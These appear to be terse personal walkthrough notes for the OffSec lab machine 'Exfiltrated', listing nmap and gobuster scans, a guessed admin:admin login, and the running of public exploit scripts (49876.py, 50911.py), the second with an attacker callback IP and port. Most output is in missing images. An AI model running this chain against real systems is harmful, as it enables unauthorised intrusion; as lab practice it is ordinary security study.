└─$ sudo nmap -Pn -n 192.168.159.163 -p- -sC -sV --min-rate=5000

![[wt image 103.png]]

80

![[wt image 104.png]]

http://exfiltrated.offsec/changelog.txt

![[wt image 105.png]]

└─$ gobuster dir -u http://exfiltrated.offsec -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -k -x php,html,txt,zip,git -t 20 -b 400,401,403,504,404 --exclude-length 355

![[wt image 106.png]]

![[wt image 107.png]]

予想

admin:admin

Login Success

└─$ python3 49876.py -u http://exfiltrated.offsec/panel/ -l admin -p admin

![[wt image 108.png]]

![[wt image 109.png]]

![[wt image 110.png]]

└─$ python3 50911.py -s 192.168.45.176 4445

![[wt image 111.png]]

![[wt image 112.png]]

![[wt image 113.png]]

![[wt image 114.png]]